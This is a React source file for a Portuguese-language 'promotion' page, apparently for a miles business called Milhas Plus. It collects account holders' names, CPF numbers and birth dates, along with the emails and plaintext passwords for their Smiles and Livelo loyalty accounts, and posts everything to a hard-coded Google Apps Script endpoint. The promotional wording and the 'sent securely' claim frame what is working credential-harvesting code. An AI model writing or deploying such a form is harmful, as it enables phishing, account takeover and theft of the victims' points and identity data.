import { useState, useRef } from "react";


const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz6AUd4NtaW9cSXaT4hAA8PtygJYfGlX4WWH-uL0Hw1D-SgyOjLSzaVV1p0nvZJt_W5oA/exec";

const entradaVazia = () => ({
  id: Date.now() + Math.random(),
  titularNome: "",
  cpf: "",
  dataNasc: "",
  emailSmiles: "",
  senhaSmiles: "",
  emailLivelo: "",
  senhaLivelo: "",
});

function Input({ label, value, onChange, placeholder, type = "text", senhaKey, senhasVisiveis, toggleSenha }) {
  return (
    <div style={s.field}>
      <label style={s.label}>{label}</label>
      {senhaKey ? (
        <div style={s.senhaWrap}>
          <input
            style={{ ...s.input, paddingRight: 42 }}
            type={senhasVisiveis[senhaKey] ? "text" : "password"}
            value={value}
            onChange={onChange}
            placeholder={placeholder}
          />
          <button style={s.eyeBtn} onClick={() => toggleSenha(senhaKey)} type="button">
            {senhasVisiveis[senhaKey] ? "🙈" : "👁"}
          </button>
        </div>
      ) : (
        <input style={s.input} type={type} value={value} onChange={onChange} placeholder={placeholder} />
      )}
    </div>
  );
}

export default function VipSelectPromo() {
  const [etapa, setEtapa] = useState("form");
  const [contato, setContato] = useState("");
  const [responsavel, setResponsavel] = useState("");
  const [entradas, setEntradas] = useState([entradaVazia()]);
  const [erroMsg, setErroMsg] = useState("");
  const [senhasVisiveis, setSenhasVisiveis] = useState({});
  const [expandido, setExpandido] = useState({});

  const formatarTel = (v) => {
    const n = v.replace(/\D/g, "").slice(0, 11);
    if (n.length <= 2) return n.length ? `(${n}` : "";
    if (n.length <= 7) return `(${n.slice(0, 2)}) ${n.slice(2)}`;
    return `(${n.slice(0, 2)}) ${n.slice(2, 7)}-${n.slice(7)}`;
  };

  const formatarData = (v) => {
    const n = v.replace(/\D/g, "").slice(0, 8);
    if (n.length <= 2) return n;
    if (n.length <= 4) return `${n.slice(0, 2)}/${n.slice(2)}`;
    return `${n.slice(0, 2)}/${n.slice(2, 4)}/${n.slice(4)}`;
  };

  const atualizarEntrada = (id, campo, valor) => {
    setEntradas(entradas.map((e) => (e.id === id ? { ...e, [campo]: valor } : e)));
  };

  const adicionarEntrada = () => {
    const nova = entradaVazia();
    setEntradas([...entradas, nova]);
    setExpandido((p) => ({ ...p, [nova.id]: true }));
  };

  const removerEntrada = (id) => {
    if (entradas.length > 1) setEntradas(entradas.filter((e) => e.id !== id));
  };

  const toggleSenha = (key) => setSenhasVisiveis((p) => ({ ...p, [key]: !p[key] }));
  const toggleExpand = (id) => setExpandido((p) => ({ ...p, [id]: !p[id] }));

  const validar = () => {
    if (!contato.trim() || contato.replace(/\D/g, "").length < 10) return "Preencha um contato válido.";
    if (!responsavel.trim()) return "Preencha o nome do responsável.";
    for (let i = 0; i < entradas.length; i++) {
      const e = entradas[i];
      if (!e.titularNome.trim()) return `Conta ${i + 1}: preencha o titular.`;
      if (e.cpf.replace(/\D/g, "").length !== 11) return `Conta ${i + 1}: CPF inválido.`;
      if (!e.dataNasc.trim() || e.dataNasc.replace(/\D/g, "").length < 8) return `Conta ${i + 1}: data de nascimento inválida.`;
      if (!e.emailSmiles.trim()) return `Conta ${i + 1}: preencha o email Smiles.`;
      if (!e.senhaSmiles.trim()) return `Conta ${i + 1}: preencha a senha Smiles.`;
      if (!e.emailLivelo.trim()) return `Conta ${i + 1}: preencha o email Livelo.`;
      if (!e.senhaLivelo.trim()) return `Conta ${i + 1}: preencha a senha Livelo.`;
    }
    return null;
  };

  const enviar = async () => {
    const erro = validar();
    if (erro) { setErroMsg(erro); return; }
    setErroMsg("");
    setEtapa("enviando");

    const rows = entradas.map((e) => ({
      contato,
      responsavel: responsavel.trim(),
      titular: e.titularNome.trim(),
      cpf: e.cpf.replace(/\D/g, ""),
      senhaSmiles: e.senhaSmiles,
      dataNasc: e.dataNasc,
      emailSmiles: e.emailSmiles.trim(),
      emailLivelo: e.emailLivelo.trim(),
      senhaLivelo: e.senhaLivelo,
    }));

    if (!APPS_SCRIPT_URL) {
      console.log("Payload (demo):", JSON.stringify(rows, null, 2));
      await new Promise((r) => setTimeout(r, 1500));
      setEtapa("sucesso");
      return;
    }

    try {
      await fetch(APPS_SCRIPT_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ rows }),
      });
      setEtapa("sucesso");
    } catch {
      setEtapa("erro");
    }
  };

  const resetar = () => {
    setContato("");
    setResponsavel("");
    setEntradas([entradaVazia()]);
    setSenhasVisiveis({});
    setExpandido({});
    setErroMsg("");
    setEtapa("form");
  };

  return (
    <div style={s.page}>
      <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />

      {/* Decorative top band */}
      <div style={s.topBand}>
        <div style={s.bandPattern} />
      </div>

      {/* Hero */}
      <section style={s.hero}>
        <div style={s.promoTag}>Promoção Exclusiva</div>
        <h1 style={s.title}>
          Cadastre suas<br /><span style={s.titleAccent}>contas</span>
        </h1>
        <p style={s.subtitle}>
          Preencha os dados das suas contas <strong>Smiles</strong> e <strong>Livelo</strong> de forma rápida e segura.
        </p>
        <div style={s.chips}>
          <span style={s.chipSmiles}>😊 Smiles</span>
          <span style={s.chipLivelo}>💎 Livelo</span>
        </div>
      </section>

      {etapa === "form" && (
        <section style={s.formWrap}>
          {/* Responsável */}
          <div style={s.card}>
            <div style={s.cardIcon}>👤</div>
            <h2 style={s.cardTitle}>Responsável</h2>
            <div style={s.cardGrid2}>
              <Input label="Nome do responsável" value={responsavel} onChange={(e) => setResponsavel(e.target.value)} placeholder="Seu nome" />
              <Input label="Contato (WhatsApp)" value={contato} onChange={(e) => setContato(formatarTel(e.target.value))} placeholder="(21) 99999-9999" />
            </div>
          </div>

          {/* Contas */}
          {entradas.map((ent, idx) => {
            const isOpen = expandido[ent.id] !== false;
            return (
              <div key={ent.id} style={s.card}>
                <div style={s.contaHeaderRow} onClick={() => toggleExpand(ent.id)}>
                  <div style={s.contaHeaderLeft}>
                    <div style={s.contaNum}>{idx + 1}</div>
                    <div>
                      <h2 style={s.cardTitle2}>
                        {ent.titularNome || `Conta ${idx + 1}`}
                      </h2>
                      {!isOpen && ent.titularNome && (
                        <span style={s.contaPreview}>
                          {ent.emailSmiles && `Smiles: ${ent.emailSmiles}`}
                          {ent.emailSmiles && ent.emailLivelo && " · "}
                          {ent.emailLivelo && `Livelo: ${ent.emailLivelo}`}
                        </span>
                      )}
                    </div>
                  </div>
                  <div style={s.contaActions}>
                    {entradas.length > 1 && (
                      <button style={s.removeBtn} onClick={(ev) => { ev.stopPropagation(); removerEntrada(ent.id); }}>✕</button>
                    )}
                    <span style={{ ...s.chevron, transform: isOpen ? "rotate(180deg)" : "rotate(0)" }}>▾</span>
                  </div>
                </div>

                {isOpen && (
                  <div style={s.contaBody}>
                    {/* Dados pessoais */}
                    <div style={s.sectionLabel}>
                      <span style={s.sectionDot} />
                      Dados do titular
                    </div>
                    <div style={s.cardGrid3}>
                      <Input label="Nome do titular" value={ent.titularNome} onChange={(e) => atualizarEntrada(ent.id, "titularNome", e.target.value)} placeholder="Nome completo" />
                      <Input label="CPF (só números)" value={ent.cpf} onChange={(e) => atualizarEntrada(ent.id, "cpf", e.target.value.replace(/\D/g, "").slice(0, 11))} placeholder="00000000000" />
                      <Input label="Data de nascimento" value={ent.dataNasc} onChange={(e) => atualizarEntrada(ent.id, "dataNasc", formatarData(e.target.value))} placeholder="DD/MM/AAAA" />
                    </div>

                    {/* Smiles */}
                    <div style={s.sectionLabel}>
                      <span style={{ ...s.sectionDot, background: "#FF6600" }} />
                      Smiles
                    </div>
                    <div style={s.cardGrid2}>
                      <Input label="Email da conta" value={ent.emailSmiles} onChange={(e) => atualizarEntrada(ent.id, "emailSmiles", e.target.value)} placeholder="email@smiles.com" />
                      <Input label="Senha" value={ent.senhaSmiles} onChange={(e) => atualizarEntrada(ent.id, "senhaSmiles", e.target.value)} placeholder="••••••••" senhaKey={`smiles-${ent.id}`} senhasVisiveis={senhasVisiveis} toggleSenha={toggleSenha} />
                    </div>

                    {/* Livelo */}
                    <div style={s.sectionLabel}>
                      <span style={{ ...s.sectionDot, background: "#6B2D8B" }} />
                      Livelo
                    </div>
                    <div style={s.cardGrid2}>
                      <Input label="Email da conta" value={ent.emailLivelo} onChange={(e) => atualizarEntrada(ent.id, "emailLivelo", e.target.value)} placeholder="email@livelo.com" />
                      <Input label="Senha" value={ent.senhaLivelo} onChange={(e) => atualizarEntrada(ent.id, "senhaLivelo", e.target.value)} placeholder="••••••••" senhaKey={`livelo-${ent.id}`} senhasVisiveis={senhasVisiveis} toggleSenha={toggleSenha} />
                    </div>
                  </div>
                )}
              </div>
            );
          })}

          <button style={s.addBtn} onClick={adicionarEntrada}>
            <span style={s.addPlus}>+</span>
            Adicionar outra conta
          </button>

          {erroMsg && <div style={s.erroBox}>⚠ {erroMsg}</div>}

          <button style={s.submitBtn} onClick={enviar}>
            Enviar cadastro
            <span style={s.arrow}>→</span>
          </button>
          <p style={s.disclaimer}>🔒 Dados enviados com segurança direto para a equipe Milhas Plus.</p>
        </section>
      )}

      {etapa === "enviando" && (
        <div style={s.statusBox}>
          <div style={s.spinner} />
          <h2 style={s.statusTitle}>Enviando...</h2>
          <p style={s.statusSub}>Aguarde um instante</p>
        </div>
      )}

      {etapa === "sucesso" && (
        <div style={s.statusBox}>
          <div style={s.successIcon}>✓</div>
          <h2 style={s.statusTitle}>Cadastro enviado!</h2>
          <p style={s.statusSub}>{entradas.length} conta{entradas.length > 1 ? "s" : ""} registrada{entradas.length > 1 ? "s" : ""}. Fique atento ao WhatsApp.</p>
          <button style={s.resetBtn} onClick={resetar}>Novo cadastro</button>
        </div>
      )}

      {etapa === "erro" && (
        <div style={s.statusBox}>
          <div style={{ ...s.successIcon, background: "#fee", color: "#c00" }}>!</div>
          <h2 style={s.statusTitle}>Erro no envio</h2>
          <p style={s.statusSub}>Tente novamente ou fale conosco pelo WhatsApp.</p>
          <button style={s.resetBtn} onClick={() => setEtapa("form")}>Tentar novamente</button>
        </div>
      )}

      <footer style={s.footer}>Milhas Plus © 2026 · VIP Select Promo</footer>

      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
        @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
        input::placeholder { color: #a0a0a0; }
        input:focus { outline: none; border-color: #1A3C34 !important; box-shadow: 0 0 0 3px #1A3C3412; }
        button { cursor: pointer; transition: all .15s; }
        button:active { transform: scale(0.97); }
      `}</style>
    </div>
  );
}

const s = {
  page: {
    minHeight: "100vh",
    background: "#FAFAF6",
    fontFamily: "'Plus Jakarta Sans', sans-serif",
    color: "#1A3C34",
    position: "relative",
  },
  topBand: {
    height: 6,
    background: "linear-gradient(90deg, #1A3C34, #F2D645, #1A3C34)",
    position: "relative",
    overflow: "hidden",
  },
  bandPattern: {
    position: "absolute",
    inset: 0,
    background: "repeating-linear-gradient(90deg, transparent, transparent 40px, #ffffff20 40px, #ffffff20 42px)",
  },

  hero: {
    textAlign: "center",
    padding: "32px 24px 28px",
    animation: "fadeUp .5s ease-out",
  },
  promoTag: {
    display: "inline-block",
    background: "#1A3C34",
    color: "#F2D645",
    fontSize: 11,
    fontWeight: 700,
    padding: "5px 16px",
    borderRadius: 20,
    letterSpacing: "0.08em",
    textTransform: "uppercase",
    marginBottom: 16,
  },
  title: {
    fontFamily: "'Sora', sans-serif",
    fontSize: 38,
    fontWeight: 800,
    lineHeight: 1.05,
    letterSpacing: "-0.03em",
    color: "#1A3C34",
    marginBottom: 12,
  },
  titleAccent: {
    color: "#F2D645",
    textShadow: "1px 1px 0 #1A3C3425",
    fontSize: 48,
  },
  subtitle: {
    fontSize: 15,
    color: "#4a6a60",
    maxWidth: 380,
    margin: "0 auto 18px",
    lineHeight: 1.6,
    fontWeight: 400,
  },
  chips: {
    display: "flex",
    justifyContent: "center",
    gap: 10,
  },
  chipSmiles: {
    fontSize: 13,
    fontWeight: 600,
    padding: "7px 16px",
    borderRadius: 20,
    background: "#FF660012",
    color: "#CC5200",
    border: "1px solid #FF660030",
  },
  chipLivelo: {
    fontSize: 13,
    fontWeight: 600,
    padding: "7px 16px",
    borderRadius: 20,
    background: "#6B2D8B12",
    color: "#6B2D8B",
    border: "1px solid #6B2D8B30",
  },

  formWrap: {
    maxWidth: 580,
    margin: "0 auto",
    padding: "0 16px 40px",
    animation: "fadeUp .5s ease-out .15s both",
  },

  card: {
    background: "#fff",
    borderRadius: 14,
    padding: "22px 22px 18px",
    marginBottom: 14,
    border: "1px solid #e8e5dd",
    boxShadow: "0 1px 3px #0000000a",
  },
  cardIcon: {
    fontSize: 20,
    marginBottom: 6,
  },
  cardTitle: {
    fontFamily: "'Sora', sans-serif",
    fontSize: 16,
    fontWeight: 700,
    color: "#1A3C34",
    marginBottom: 16,
  },
  cardTitle2: {
    fontFamily: "'Sora', sans-serif",
    fontSize: 15,
    fontWeight: 700,
    color: "#1A3C34",
    margin: 0,
  },

  // Conta header
  contaHeaderRow: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    cursor: "pointer",
    userSelect: "none",
  },
  contaHeaderLeft: {
    display: "flex",
    alignItems: "center",
    gap: 12,
  },
  contaNum: {
    width: 32,
    height: 32,
    borderRadius: 8,
    background: "#F2D645",
    color: "#1A3C34",
    fontFamily: "'Sora', sans-serif",
    fontWeight: 800,
    fontSize: 14,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    flexShrink: 0,
  },
  contaPreview: {
    fontSize: 12,
    color: "#8a9a94",
    marginTop: 2,
    display: "block",
  },
  contaActions: {
    display: "flex",
    alignItems: "center",
    gap: 8,
  },
  chevron: {
    fontSize: 16,
    color: "#8a9a94",
    transition: "transform .2s",
  },
  removeBtn: {
    width: 26,
    height: 26,
    borderRadius: 6,
    background: "#fef2f2",
    border: "1px solid #fecaca",
    color: "#dc2626",
    fontSize: 11,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    cursor: "pointer",
  },

  contaBody: {
    marginTop: 18,
    paddingTop: 16,
    borderTop: "1px solid #f0ede6",
  },

  sectionLabel: {
    display: "flex",
    alignItems: "center",
    gap: 8,
    fontSize: 12,
    fontWeight: 700,
    color: "#6a8a80",
    textTransform: "uppercase",
    letterSpacing: "0.06em",
    marginBottom: 12,
    marginTop: 8,
  },
  sectionDot: {
    width: 8,
    height: 8,
    borderRadius: 4,
    background: "#1A3C34",
    display: "inline-block",
  },

  cardGrid2: {
    display: "grid",
    gridTemplateColumns: "1fr 1fr",
    gap: 12,
    marginBottom: 8,
  },
  cardGrid3: {
    display: "grid",
    gridTemplateColumns: "1fr 1fr 1fr",
    gap: 12,
    marginBottom: 8,
  },

  field: {
    display: "flex",
    flexDirection: "column",
    gap: 5,
  },
  label: {
    fontSize: 11,
    fontWeight: 600,
    color: "#7a8a84",
    textTransform: "uppercase",
    letterSpacing: "0.05em",
  },
  input: {
    width: "100%",
    padding: "11px 12px",
    background: "#FAFAF6",
    border: "1.5px solid #e0ddd5",
    borderRadius: 8,
    color: "#1A3C34",
    fontSize: 14,
    fontFamily: "'Plus Jakarta Sans', sans-serif",
    transition: "all .2s",
  },
  senhaWrap: {
    position: "relative",
  },
  eyeBtn: {
    position: "absolute",
    right: 8,
    top: "50%",
    transform: "translateY(-50%)",
    background: "none",
    border: "none",
    fontSize: 14,
    padding: 4,
  },

  addBtn: {
    width: "100%",
    padding: 14,
    background: "#fff",
    border: "2px dashed #d4d0c8",
    borderRadius: 12,
    color: "#6a8a80",
    fontSize: 14,
    fontFamily: "'Plus Jakarta Sans', sans-serif",
    fontWeight: 600,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: 8,
    marginBottom: 14,
  },
  addPlus: {
    width: 24,
    height: 24,
    borderRadius: 6,
    background: "#F2D645",
    color: "#1A3C34",
    fontWeight: 800,
    fontSize: 16,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    lineHeight: 1,
  },

  erroBox: {
    background: "#fef2f2",
    border: "1px solid #fecaca",
    borderRadius: 10,
    padding: "11px 16px",
    marginBottom: 14,
    fontSize: 13,
    color: "#dc2626",
    fontWeight: 500,
  },

  submitBtn: {
    width: "100%",
    padding: "16px 24px",
    background: "#1A3C34",
    border: "none",
    borderRadius: 12,
    color: "#F2D645",
    fontSize: 16,
    fontFamily: "'Sora', sans-serif",
    fontWeight: 700,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: 10,
    letterSpacing: "0.01em",
    boxShadow: "0 4px 16px #1A3C3440",
  },
  arrow: {
    fontSize: 20,
    fontWeight: 400,
  },
  disclaimer: {
    textAlign: "center",
    fontSize: 12,
    color: "#a0a09a",
    marginTop: 14,
    lineHeight: 1.5,
  },

  statusBox: {
    maxWidth: 400,
    margin: "60px auto",
    padding: "48px 28px",
    textAlign: "center",
    animation: "fadeUp .4s ease-out",
  },
  spinner: {
    width: 44,
    height: 44,
    border: "3px solid #e0ddd5",
    borderTopColor: "#1A3C34",
    borderRadius: "50%",
    margin: "0 auto 20px",
    animation: "spin .7s linear infinite",
  },
  successIcon: {
    width: 60,
    height: 60,
    borderRadius: "50%",
    background: "#F2D64530",
    color: "#1A3C34",
    fontSize: 26,
    fontWeight: 800,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    margin: "0 auto 18px",
  },
  statusTitle: {
    fontFamily: "'Sora', sans-serif",
    fontSize: 20,
    fontWeight: 700,
    color: "#1A3C34",
    marginBottom: 6,
  },
  statusSub: {
    fontSize: 14,
    color: "#6a8a80",
    lineHeight: 1.6,
  },
  resetBtn: {
    marginTop: 22,
    padding: "11px 28px",
    background: "#F2D645",
    border: "none",
    borderRadius: 10,
    color: "#1A3C34",
    fontSize: 14,
    fontFamily: "'Plus Jakarta Sans', sans-serif",
    fontWeight: 700,
  },

  footer: {
    textAlign: "center",
    padding: "28px 20px",
    fontSize: 12,
    color: "#b0b0aa",
  },
};
